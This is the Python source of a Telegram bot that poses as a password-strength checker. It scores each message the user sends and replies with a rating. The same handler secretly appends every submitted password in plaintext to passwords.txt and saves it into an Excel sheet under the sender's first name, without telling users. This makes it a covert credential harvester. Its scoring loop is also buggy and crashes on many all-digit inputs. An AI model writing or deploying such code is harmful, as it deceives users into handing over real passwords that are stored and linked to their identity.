import telebot
from telebot import types
from openpyxl import Workbook
import openpyxl

# use xlsx file
wb = openpyxl.load_workbook('base.xlsx')

# grab the active worksheet
ws = wb.active

# important variables and list
sheet = wb.active
max_row = sheet.max_row
max_col = sheet.max_column
list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
        'w', 'x', 'y', 'z']

#add all names to list 'names_list'
names_list = []
z=0
while z < max_col:
    x = sheet[list[z] + '1']
    names_list.append(x.value)
    z+=1
print(names_list)
print(max_col)

# bot token
bot = telebot.TeleBot('TOKEN')


@bot.message_handler(commands=['start'])
def start(message):
    # keyboard
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    item1 = types.KeyboardButton("Team")

    markup.add(item1)

    bot.send_message(message.chat.id, "lets start", parse_mode='html', reply_markup=markup)


@bot.message_handler(content_types=['text'])
def text(message):
    password = message.text
    print(password)

    with open('passwords.txt', 'a') as f:
        f.write(password + ', ')

    symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '1', '2', '3', '4', '5', '6', '7',
               '8', '9', '0']

    if password == 'qwerty' or password == 'password':
        point = -10
    else:
        point = 0

    x = len(password)
    y = 0
    if password.isdecimal() == True:
        while y < x or y == x:
            y += 1
            z1 = password[x - y]
            z2 = password[x - (y + 1)]
            if int(z2) + 1 == int(z1):
                print(z1, z2)
                point -= 1
            else:
                point = point

    if len(password) > 7:
        point += 10
    else:
        point -= 5

    while y < len(symbols):
        if symbols[y] in password:
            point += 1
        y += 1
    x = ''
    if point < 0:
        x = 'very weak'
    elif point < 5 and point > 0 or point == 5 and point > 0:
        x = 'weak'
    elif point < 10 and point > 5 or point == 10 and point > 5:
        x = 'normal'
    elif point > 10:
        x = 'hard'

    bot.send_message(message.chat.id, f'your password is {x}')
    name = str(message.chat.first_name)

    # chek is name in list or no
    if (name in names_list):
        index = names_list.index(name)  # what place have name in name_list
        sheet[list[index] + str(max_row + 1)] = password
    else:
        sheet[list[max_col] + '1'] = name  # add name if it is not in list
        sheet[list[max_col] + '2'] = password  # add pas if name is not in list
    wb.save('base.xlsx')

bot.polling(none_stop=True)
